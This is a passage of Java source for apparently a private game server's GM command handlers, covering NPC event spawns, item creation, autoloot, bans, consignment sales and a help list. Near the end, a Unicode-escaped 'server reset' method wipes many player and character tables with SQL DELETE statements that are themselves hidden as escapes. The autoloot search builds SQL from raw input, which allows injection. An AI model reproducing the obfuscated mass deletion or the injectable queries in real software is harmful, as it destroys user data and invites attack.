				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "\\aD곧이어 메티스의 축복 버프가 " + time + "\\aD시간 동안 기란 마을에 출현 합니다.");
				L1World.getInstance().broadcastServerMessage("\\aD곧이어 메티스의 축복 버프가 " + time + "시간 동안 기란 마을에 출현 합니다.");
				
			} else if (event.equalsIgnoreCase("메티스버프10")) {
				L1SpawnUtil.Gmspawn(537, 33430, 32807, (short) 4, 5, time * 60 * 60 * 1000);// 기란
				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "\\aD곧이어 메티스의 축복 버프가 " + time + "\\aD시간 동안 기란 마을에 출현 합니다.");
				L1World.getInstance().broadcastServerMessage("\\aD곧이어 메티스의 축복 버프가 " + time + "시간 동안 기란 마을에 출현 합니다.");
				
			} else if (event.equalsIgnoreCase("메티스버프11")) {
				L1SpawnUtil.Gmspawn(538, 33430, 32807, (short) 4, 5, time * 60 * 60 * 1000);// 기란
				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "\\aD곧이어 메티스의 축복 버프가 " + time + "\\aD시간 동안 기란 마을에 출현 합니다.");
				L1World.getInstance().broadcastServerMessage("\\aD곧이어 메티스의 축복 버프가 " + time + "시간 동안 기란 마을에 출현 합니다.");
				
			} else if (event.equalsIgnoreCase("메티스버프12")) {
				L1SpawnUtil.Gmspawn(539, 33430, 32807, (short) 4, 5, time * 60 * 60 * 1000);// 기란
				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "\\aD곧이어 메티스의 축복 버프가 " + time + "\\aD시간 동안 기란 마을에 출현 합니다.");
				L1World.getInstance().broadcastServerMessage("\\aD곧이어 메티스의 축복 버프가 " + time + "시간 동안 기란 마을에 출현 합니다.");
			}
		} catch (Exception e) {
			gm.sendPackets("[.메티스버프] [메티스버프] [시간]");
			gm.sendPackets("예).메티스버프 메티스버프 1~12");
		}
	}

	private void get_delete_gfx(L1PcInstance pc) {
		try {
			Iterator<L1NpcInstance> iter = list.iterator();
			L1NpcInstance npc = null;

			while (iter.hasNext()) {
				npc = iter.next();
				if (npc == null)
					continue;
				npc.deleteMe();
			}

			list.clear();
			pc.sendPackets("'이미지 삭제' 가 완료 되었습니다.");
		} catch (Exception e) {
			pc.sendPackets("커멘드: .이미지삭제 로 입력 바랍니다.");
		}
	}

	private static Random _rnd = new Random();

	public static Random getRnd() {
		return _rnd;
	}


	/*
	 * private void showCastleWarTime(L1PcInstance pc, String param) {
	 * L1Castle[] castles = WarTimeController.getInstance().getCastleArray();
	 * Calendar[] startTime =
	 * WarTimeController.getInstance().getWarStartTimeArray(); Calendar[]
	 * endTime = WarTimeController.getInstance().getWarEndTimeArray();
	 * SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm");
	 * try { StringTokenizer tok = new StringTokenizer(param); String name =
	 * tok.nextToken(); for (int i = 0; i < castles.length; i++) { L1Castle
	 * castle = castles[i]; if (castle.getName().startsWith(name)) {
	 * pc.sendPackets(String.format("%s: %s ~ %s", castle.getName(),
	 * formatter.format(startTime[i].getTime()),
	 * formatter.format(endTime[i].getTime())))); } } Calendar cal =
	 * Calendar.getInstance(); pc.sendPackets(String.format( "서버시간: %s",
	 * formatter.format(cal.getTime())))); } catch (Exception e) {
	 * pc.sendPackets(".공성시간 (켄트,오크,윈다,기란,하이,드워,아덴,디아)")); } }
	 */

	private void maphack(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String on = st.nextToken();
			if (on.equalsIgnoreCase("켬")) {
				SC_Ability.send(gm, 3, true);
				gm.sendPackets("라이트 : 켬");
			} else if (on.equals("끔")) {
				SC_Ability.send(gm, 3, false);
				gm.sendPackets("라이트 : 끔");
			}
		} catch (Exception e) {
			gm.sendPackets(".라이트 [켬, 끔] 으로 설정 하세요.");
		}
	}

	public static int get_random(int min, int max) {
		if (min > max)
			return min;
		return _rnd.nextInt(max - min + 1) + min;
	}
	private void show2(L1PcInstance gm) {
		
		
		int num = get_random(1, 300);
			//int ass = num;
		L1QuestInfo info = gm.getQuestList(num);
		SC_QuestTalkIsland.sendUpdate(gm, num, info);
		gm.sendPackets(num+"입니다.");
		
	}
	// TODO GM 커멘드 추가
	private void showHelp(L1PcInstance gm) {
		SC_ChatPacket.sendDirect(gm, gm, "\\aA---------------- [\\aGGM\\aA] \\aG[\\aGCOMMANDS\\aA] ---------------");
		SC_ChatPacket.sendDirect(gm, gm, "[기본]:.귀환.출두.소환.위치.누구.마을.챗.감옥.가라.답장", 1);
		SC_ChatPacket.sendDirect(gm, gm, "[설정]:.무인.변신.레벨.피케이.리로드.혈탈퇴.오토루팅", 1);
		SC_ChatPacket.sendDirect(gm, gm, "	          .드랍불가 .창고불가 .교환불가.오토루팅.전체정리", 1);
		SC_ChatPacket.sendDirect(gm, gm, "	          .오픈대기.편지삭제.인벤삭제.공성시간.공성시작", 1);
		SC_ChatPacket.sendDirect(gm, gm, "			          .공성종료.성혈조작.압류해제.압류목록.아지트지급", 1);
		SC_ChatPacket.sendDirect(gm, gm, "			          .밸런스.상점리로드.혈맹경험치.데드락", 1);
		SC_ChatPacket.sendDirect(gm, gm, "			          .정리.메모리반환.포트변경.상점검사.유즈타입", 1);
		SC_ChatPacket.sendDirect(gm, gm, "[계정]:.셋팅.정보.계정.암호변경.계정압류.영구추방", 1);
		SC_ChatPacket.sendDirect(gm, gm, "          .아이피추방.광역추방.계정정보.계정추가.페널티", 1);
		SC_ChatPacket.sendDirect(gm, gm, "          .경험치복구.퀴즈변경.밴아이피.상점추방.유저인벤삭제", 1);
		SC_ChatPacket.sendDirect(gm, gm, "          .캐릭압류 .캐릭압류해제", 1);
		SC_ChatPacket.sendDirect(gm, gm, "[검사]:.이동.추방.조회.감시.검색.채금.공개채금.채금해제", 1);
		SC_ChatPacket.sendDirect(gm, gm, "[서버]:.스폰.배치.몬스터.아이템.전체선물.파티a.랭킹갱신", 1);
		SC_ChatPacket.sendDirect(gm, gm, "[버프]:.버프.소생.속도.렙선물.전체버프.통합버프", 1);
		SC_ChatPacket.sendDirect(gm, gm, "	          .개인버프.인벤이미지.공속체크.이속체크.마법체크", 1);
		SC_ChatPacket.sendDirect(gm, gm, "	          .이미지.서먼.아이콘.이미지.이펙트.렙작", 1);
		SC_ChatPacket.sendDirect(gm, gm, "[기타]:.피바.투명.서버저장.파티소환", 1);
		SC_ChatPacket.sendDirect(gm, gm, "	          .인형청소 .악마왕 .영자상점(1~3)", 1);
		SC_ChatPacket.sendDirect(gm, gm, "	          에르자베 .샌드웜 .기운축복 .지배보스", 1);
		SC_ChatPacket.sendDirect(gm, gm, "	          룬스톤카배 .룬스톤디스 .룬스톤데페 .룬스톤아머", 1);
		//(new SC_ChatPacket(gm, "	          그랑카인 .그랑카인초기화", 1)).send(gm);
		//(new SC_ChatPacket(gm, "	          진데스진레 .진데스살키 .진데스진싸 .진데스제로스", 1)).send(gm);
		//(new SC_ChatPacket(gm, "	          진데스데불 진데스론론 .진데스포효 .진데스섬체", 1)).send(gm);
		//(new SC_ChatPacket(gm, "	          진데스커검 .진데스태풍 .진데스악몽 .진데스나발", 1)).send(gm);
		SC_ChatPacket.sendDirect(gm, gm, "	          데페작업 .아머작업 .카배작업 .계정검사", 1);
		SC_ChatPacket.sendDirect(gm, gm, "	          데몬작업 .데스작업 .타락작업", 1);
		//(new SC_ChatPacket(gm, "	          .이벤트.노딜.계좌.버프아이콘 .케릭검사", 1)).send(gm);
		SC_ChatPacket.sendDirect(gm, gm, "	          .혈맹밴.주변밴.광역밴", 1);
		SC_ChatPacket.sendDirect(gm, gm, "	          .엔코인충전.엔코인회수.엔코인확인", 1);
		SC_ChatPacket.sendDirect(gm, gm, "	          .아이템삭제 .아지트리로드 .탐선물", 1);
		SC_ChatPacket.sendDirect(gm, gm, "	          .데스크,데방,데무 .제작체크 .텔렉", 1);
		SC_ChatPacket.sendDirect(gm, gm, "	          .레이드 .인스턴스 .랭킹시스템 .잠수모드 .잠수해제", 1);
		SC_ChatPacket.sendDirect(gm, gm, "	          .킬차트 .넷세이프 .아이피딜레이체크", 1);
		SC_ChatPacket.sendDirect(gm, gm, "	          .보호모드 .네트워크  .좌표", 1);
		SC_ChatPacket.sendDirect(gm, gm, "	          .오브젝트리스트 .리로드몬스폰(사용법있음) ", 1);
		SC_ChatPacket.sendDirect(gm, gm, "	          .배틀시스템 .캡챠(오토방지) .캐릭터상태", 1);
		SC_ChatPacket.sendDirect(gm, gm, "	          .인챈트시스템(tb_enchanties..)", 1);
		SC_ChatPacket.sendDirect(gm, gm, "	          .저주 .저주초기화 .던전타이머", 1);
		SC_ChatPacket.sendDirect(gm, gm, "	          .판매등록 .판매취소 .판매완료 .구매신청", 1);
		SC_ChatPacket.sendDirect(gm, gm, "	          .판매삭제 .구매취소 .혈맹정보", 1);
		SC_ChatPacket.sendDirect(gm, gm, "	          .푸쉬시스템 .혈마크 .계정확인 .보스", 1);
		SC_ChatPacket.sendDirect(gm, gm, "	          .무기인챈성공 .방어인챈성공 .인형박스", 1);
		SC_ChatPacket.sendDirect(gm, gm, "	          .화면어벤 .화면축복 .화면생마 .화면코마 .화면흑사", 1);
		SC_ChatPacket.sendDirect(gm, gm, "	          .화면템주기 .엔피씨다운 .원격교환 .전체채팅", 1);
		SC_ChatPacket.sendDirect(gm, gm, "	          .혈맹포인트조회 .혈맹포인트삭제 .혈맹포인트선물", 1);
		SC_ChatPacket.sendDirect(gm, gm, "	          .킬증가 .킬삭제 .데스증가 .데스삭제 .잠재력조회", 1);
		SC_ChatPacket.sendDirect(gm, gm, "	          .맵인원 .서버초기화", 1);
		SC_ChatPacket.sendDirect(gm, gm, "\\aA------------------ [\\aGGM\\aA] \\aG[\\aGEND\\aA] -------------------");
	}

	private static Map<Integer, String> _lastCommands = new HashMap<Integer, String>();

	private void searchDatabase(L1PcInstance gm, String param) {
		try {
			StringTokenizer tok = new StringTokenizer(param);
			int type = Integer.parseInt(tok.nextToken());
			String name = tok.nextToken();
			searchObject(gm, type, "%" + name + "%");
		} catch (Exception e) {
			gm.sendPackets(".검색 [0~5] [name]을 입력 해주세요.");
			gm.sendPackets("0=잡템, 1=무기, 2=갑옷, 3=엔피시, 4=변신, 5=엔피시(gfxid)");
		}
	}

    
	private void doolyHelp1(L1PcInstance gm) {
		gm.sendPackets("----------------------------------------------------");
		gm.sendPackets("입금 계좌 : SC제일은행 / 없음");
		gm.sendPackets("계좌번호 : 없음");
		gm.sendPackets("----------------------------------------------------");
	}

	private void autoloot(L1PcInstance gm, String param) {
		try {
			StringTokenizer tok = new StringTokenizer(param);
			String type = tok.nextToken();
			if (type.equalsIgnoreCase("리로드")) {
				AutoLoot.getInstance();
				AutoLoot.reload();
				gm.sendPackets("오토루팅 설정이 리로드 되었습니다.");
			} else if (type.equalsIgnoreCase("검색")) {
				String nameid = tok.nextToken();
				Selector.exec(String.format(
						"select b.item_id, b.name FROM autoloot as a inner join (select item_id, name from etcitem) as b on a.item_id=b.item_id where b.name like '%%%s%%'",
						nameid), new FullSelectorHandler() {
							@Override
							public void result(ResultSet rs) throws Exception {
								while (rs.next())
									gm.sendPackets(String.format("[%d]%s", rs.getInt("item_id"), rs.getString("name")));
							}
						});
				Selector.exec(String.format(
						"select b.item_id, b.name FROM autoloot as a inner join (select item_id, name from armor) as b on a.item_id=b.item_id where b.name like '%%%s%%'",
						nameid), new FullSelectorHandler() {
							@Override
							public void result(ResultSet rs) throws Exception {
								while (rs.next())
									gm.sendPackets(String.format("[%d]%s", rs.getInt("item_id"), rs.getString("name")));
							}
						});
				Selector.exec(String.format(
						"select b.item_id, b.name FROM autoloot as a inner join (select item_id, name from weapon) as b on a.item_id=b.item_id where b.name like '%%%s%%'",
						nameid), new FullSelectorHandler() {
							@Override
							public void result(ResultSet rs) throws Exception {
								while (rs.next())
									gm.sendPackets(String.format("[%d]%s", rs.getInt("item_id"), rs.getString("name")));
							}
						});
			} else {
				String nameid = tok.nextToken();
				int itemid = 0;
				try {
					itemid = Integer.parseInt(nameid);
				} catch (NumberFormatException e) {
					itemid = ItemTable.getInstance().findItemIdByNameWithoutSpace(nameid);
					if (itemid == 0) {
						gm.sendPackets("해당 아이템이 발견되지 않습니다. ");
						return;
					}
				}

				L1Item temp = ItemTable.getInstance().getTemplate(itemid);
				if (temp == null) {
					gm.sendPackets("해당 아이템이 발견되지 않습니다. ");
					return;
				}
				if (type.equalsIgnoreCase("추가")) {
					if (AutoLoot.getInstance().isAutoLoot(itemid)) {
						gm.sendPackets("이미 오토루팅 목록에 있습니다.");
						return;
					}
					AutoLoot.getInstance().storeId(itemid);
					gm.sendPackets("오토루팅 항목에 추가 했습니다.");
				} else if (type.equalsIgnoreCase("삭제")) {
					if (!AutoLoot.getInstance().isAutoLoot(itemid)) {
						gm.sendPackets("오토루팅 항목에 해당 아이템이 없습니다.");
						return;
					}
					gm.sendPackets("오토루팅 항목에서 삭제 했습니다.");
					AutoLoot.getInstance().deleteId(itemid);
				}
			}
		} catch (Exception e) {
			gm.sendPackets(".오토루팅 리로드");
			gm.sendPackets(".오토루팅 추가|삭제 itemid|name");
			gm.sendPackets(".오토루팅 검색 name");
		}
	}

	private void LargeAreaBan(L1PcInstance pc, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			int range = Integer.parseInt(st.nextToken());
			Integer reason = SC_LoginResult.banServerCodes.get(st.nextToken());
			if (reason == null)
				throw new Exception("");
			int count = 0;
			IpTable iptable = IpTable.getInstance();
			pc.sendPackets("----------------------------------------------------");
			for (L1PcInstance player : L1World.getInstance().getVisiblePlayer(pc, range)) {
				Account.ban(player.getAccountName(), reason); // 계정을 BAN시킨다.
				iptable.banIp(player.getNetConnection().getIp()); // BAN 리스트에
				// IP를 추가한다.
				pc.sendPackets(player.getName() + ", (" + player.getAccountName() + ")");
				player.logout();
				player.getNetConnection().kick();
				count++;
			}
			pc.sendPackets("주변의 유저 " + count + "명을 영구추 시키셨습니다.");
			pc.sendPackets("----------------------------------------------------");

		} catch (Exception e) {
			pc.sendPackets(".주변밴  [범위] [압류사유번호]");
		}
	}

	private void spawnNotifyOnOff(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String on = st.nextToken();
			if (on.equalsIgnoreCase("켬")) {
				gm.setBossNotify(true);
				gm.sendPackets("보스알림:켬 (보스소환 및 알림이 실행 되었습니다)");
			} else if (on.equals("끔")) {
				gm.setBossNotify(false);
				gm.sendPackets("보스알림:끔 (보스소환 및 알림이 종료 되었습니다)");
			}
		} catch (Exception e) {
			gm.sendPackets(".보스알림 [켬, 끔]으로 설정하세요. 현재(" + (gm.isBossNotify() == true ? "켜짐" : "꺼짐") + ")입니다.");
		}
	}

	public void execute1(L1PcInstance pc, String cmdName, String arg) {
		try {

			StringTokenizer stringtokenizer = new StringTokenizer(arg);

			int count = Integer.parseInt(stringtokenizer.nextToken());
			L1ItemInstance adena = pc.getInventory().storeItem(L1ItemId.ADENA, count);

			if (adena != null) {
				pc.sendPackets((new StringBuilder()).append(count).append("아데나를 생성했습니다.").toString());
			}
		} catch (Exception e) {
			pc.sendPackets((new StringBuilder()).append(".아데나 [액수]로 입력해 주세요. ").toString());
		}
	}

	public void execute(L1PcInstance pc, String param, String arg) {
		try {
			StringTokenizer st = new StringTokenizer(arg);
			String nameid = st.nextToken();
			int count = 1;
			if (st.hasMoreTokens()) {
				count = Integer.parseInt(st.nextToken());
			}
			int enchant = 0;
			if (st.hasMoreTokens()) {
				enchant = Integer.parseInt(st.nextToken());
			}
			int attrenchant = 0;
			if (st.hasMoreTokens()) {
				attrenchant = Integer.parseInt(st.nextToken());
			}

			int itemid = 0;
			try {
				itemid = Integer.parseInt(nameid);
			} catch (NumberFormatException e) {
				itemid = ItemTable.getInstance().findItemIdByNameWithoutSpace(nameid);
				if (itemid == 0) {
					pc.sendPackets("해당 아이템이 발견되지 않습니다. ");
					return;
				}
			}
			L1Item temp = ItemTable.getInstance().getTemplate(itemid);
			if (temp != null) {
				if (temp.isStackable()) {
					L1ItemInstance item = ItemTable.getInstance().createItem(itemid);
					item.setEnchantLevel(0);
					item.setCount(count);
					item.setIdentified(true);
					if (pc.getInventory().checkAddItem(item, count) == L1Inventory.OK) {
						pc.getInventory().storeItem(item);
						SC_SystemMessage.send(pc, "\\fY아이템:[\\aA" + item.getLogName() + "\\fY] 아이템ID:[\\aA"
								+ itemid + "\\fY] 인챈트:[\\aA" + enchant + "\\fY] \\aG생성");
						;
					}
				} else {
					L1ItemInstance item = null;
					int createCount;
					for (createCount = 0; createCount < count; createCount++) {
						item = ItemTable.getInstance().createItem(itemid);
						item.setEnchantLevel(enchant);
						item.setAttrEnchantLevel(attrenchant);
						item.setIdentified(true);
						if (pc.getInventory().checkAddItem(item, 1) == L1Inventory.OK) {
							pc.getInventory().storeItem(item);
						} else {
							break;
						}
					}
					if (createCount > 0) {
						SC_SystemMessage.send(pc, "\\fY아이템:[\\aA" + item.getLogName() + "\\fY] 아이템ID:[\\aA"
								+ itemid + "\\fY] 인챈트:[\\aA" + enchant + "\\fY] \\aG생성");
						;
					}
				}
			} else {
				pc.sendPackets("지정 ID의 아이템은 존재하지 않습니다");
			}
		} catch (Exception e) {
			pc.sendPackets(".아이템 [이름] [갯수] [인챈] [속성1~20] [확인0~1] ");
		}
	}

	private void huntEvent(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String type = st.nextToken();
			if (type.equalsIgnoreCase("시작")) {
				Config.HUNT_EVENT = true;
				SC_PacketBox.broadcastGreen("크리스마스 수렵 이벤트가 진행 됩니다. 사슴과 멧돼지를 모조리 잡아주세요!");
				SC_ChatPacket.broadcastMessage("\\aA크리스마스 수렵 이벤트가 진행 됩니다. 사슴과 멧돼지를 모조리 잡아주세요!");

			} else if (type.equalsIgnoreCase("종료")) {
				Config.HUNT_EVENT = false;
				SC_PacketBox.broadcastGreen("크리스마스 수렵 이벤트가 종료 되었습니다. 나오신 '루돌프의 종'를 기란마을 산타에게 가져다 주세요.");
				SC_ChatPacket.broadcastMessage("\\aA크리스마스 수렵 이벤트가 종료 되었습니다. 나오신 '루돌프의 종'를 기란마을 산타에게 가져다 주세요.");
			}
		} catch (Exception e) {
			gm.sendPackets(".수렵 [시작 and 종료]");
		}
	}

	public static void 할파스의신의(L1PcInstance gm, String param) {
		if (!(gm.getInventory().checkEquipped(123111) || gm.getInventory().checkEquipped(123112)
				|| gm.getInventory().checkEquipped(123113))) {
			gm.sendPackets("\\fY할파스의 갑옷을 착용하고 있지 않습니다.");
			return;
		} else {

			if (gm.hasSkillEffect(L1SkillId.할파스의신의)) {
				int n = gm.getSkillEffectTimeSec(L1SkillId.할파스의신의) / 60;
				SC_SystemMessage.send(gm, String.format("\\fY할파스의 신의 : %d분 후에 활성화됩니다.", n));
			} else {
				gm.sendPackets("\\fY할파스의 신의는 활성화 상태입니다.");

			}
		}
	}
	private void Event(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String event = st.nextToken();
			String time1 = st.nextToken();
			int time = Integer.parseInt(time1);
			if (event.equalsIgnoreCase("드래곤헌터")) {
				L1SpawnUtil.Gmspawn(7320159, 33441, 32813, (short) 4, 6, time * 60 * 60 * 1000);

				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "드래곤 헌터의 가호 이벤트가 시작되었습니다. 곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");
				L1World.getInstance().broadcastServerMessage("곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");

			} else if (event.equalsIgnoreCase("특급용사1")) {
				L1SpawnUtil.Gmspawn(526, 33447, 32793, (short) 4, 5, time * 60 * 60 * 1000);// 기란

				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "특급 용사 이벤트(1) 가 시작되었습니다. 곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");
				L1World.getInstance().broadcastServerMessage("곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");

			} else if (event.equalsIgnoreCase("특급용사2")) {
				L1SpawnUtil.Gmspawn(529, 33445, 32791, (short) 4, 5, time * 60 * 60 * 1000);// 기란

				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "특급 용사 이벤트(2) 가 시작되었습니다. 곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");
				L1World.getInstance().broadcastServerMessage("곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");

			} else if (event.equalsIgnoreCase("특급용사3")) {
				L1SpawnUtil.Gmspawn(530, 33449, 32795, (short) 4, 5, time * 60 * 60 * 1000);// 기란

				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "특급 용사 이벤트(3) 가 시작되었습니다. 곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");
				L1World.getInstance().broadcastServerMessage("곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");

			} else if (event.equalsIgnoreCase("특급용사4")) {
				L1SpawnUtil.Gmspawn(531, 33444, 32797, (short) 4, 5, time * 60 * 60 * 1000);// 기란

				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "특급 용사 이벤트(4) 가 시작되었습니다. 곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");
				L1World.getInstance().broadcastServerMessage("곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");
			}
		} catch (Exception e) {
			gm.sendPackets("[.이벤트] [이벤트명] [시간]");
			gm.sendPackets("[이벤트명]: 드래곤헌터/특급용사1~4");
		}
	}

	
	public static void WriteLetter22(L1PcInstance gm, String in4, int in2,
			String in5) {
		int nu1 = 949;
		SimpleDateFormat formatter = new SimpleDateFormat("yy/MM/dd",
				Locale.KOREA);
		Date currentTime = new Date();
		String dTime = formatter.format(currentTime);
		String subject = "위탁물품판매완료";
		String content = "+ "
				+ in2
				+ " "
				+ in5
				+ "\n물품이 판매되었습니다. \n\n반드시 리스타트 후에 \n부가 아이템 창고에서\n수표를 회수하십시오.\n\n";
		String name = "위탁관리인";
		L1PcInstance target = L1World.getInstance().getPlayer(in4);
		LetterTable.getInstance().writeLetter(nu1, dTime, name, in4, 0,
				subject, content, target, () -> {
            if (target != null && target.getOnlineStatus() != 0) {
			LetterList(target, 0, 20);
			SC_SystemMessage.send(target, "\\fY물품이 판매되었습니다.");
			SC_SystemMessage.send(target, "\\fY리스 후 부가아이템창고에서 찾으실 수 있습니다.");
			SC_SkillSound.send(target, target.getId(), 1091);
			SC_ServerMessage.send(target, 428);
			SC_LetterList.sendListAsync(gm, 0, 20);
		}
        });
	}

	private static void 물품1(L1PcInstance gm, String count) {
		try {
			int i = 0;
			try {
				i = Integer.parseInt(count);
			} catch (NumberFormatException e) {
			}
			if (i <= 0) {
				// pc.sendPackets(new SC_SystemMessage(".위탁판매  (판매금액)을 적어주세요."));
				SC_SystemMessage.send(gm, "\\fY---------------------------------------------------");
				SC_SystemMessage.send(gm, "\\fY[사용방법] .물품판매 (판매금액)을 입력하면 해당금액의 인증서가 들어옵니다");
				SC_SystemMessage.send(gm, "\\fY그 인증서를 판매할 물품에 클릭하시면 물품거래게시판에 등록이 됩니다.");
				SC_SystemMessage.send(gm, "\\fY---------------------------------------------------");
				return;
			}
			if (i > 2000000000) {
				SC_SystemMessage.send(gm, "판매금액은 20억이상 판매하실수없습니다.");
				return;
			}
			if (i >= 1 && i < 10000000) {
				SC_SystemMessage.send(gm, "최소판매금액은 1000만이상 입니다.");
				return;
			}
			if (gm.getInventory().checkItem(474747)) { // 위탁판매 증서 아이템번호는 본인 팩에
														// 맞게
				SC_SystemMessage.send(gm, "물품판매 증서를 소지 하고 있으면 불가능 합니다.");
			} else {
				SC_SystemMessage.send(gm, "\\fY[물품판매 인증서]를 얻었습니다.");
				SC_SystemMessage.send(gm, "\\fY판매물품에 사용하면 게시판에 등록이 됩니다.");
				gm.getInventory().storeItem(474747, i); // 위탁판매 증서 아이템번호는 본인 팩에
															// 맞게
			}
			
		} catch (Exception exception) {
			SC_SystemMessage.send(gm, ".물품판매 (판매금액)");
			SC_SystemMessage.send(gm, "예)  .물품판매 5000000");
		}
	}
private void \uC11C\uBC84\uCD08\uAE30\uD6541(L1PcInstance pc, String param) {
		
		Connection con = null;

			try {
				con = DatabaseFactory.getInstance().getConnection();
				StringTokenizer st = new StringTokenizer(param);
				String code = st.nextToken();
				if (code.equalsIgnoreCase("\uC2DC\uC791")) {
				//L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM accounts", new Object[0]);
				//Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM attendance_startup", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM attendance_userinfo", new Object[0]);	
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_resol", new Object[0]);	
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_root", new Object[0]);	
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_blocks", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_buddys", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_buff", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_root", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_config", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_elf_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_exclude", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_root", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_exp_cache", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_fairly_config", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_items", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_new_quest", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_package_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_quest_monster", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_quests", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_shop", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_shop_store", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_skills", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_slot_items", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_soldier", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_special_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_supplementary_service", new Object[0]);		
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_tams", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_teleport", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_teleport_item", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM characters", new Object[0]);
				Thread.sleep(300);
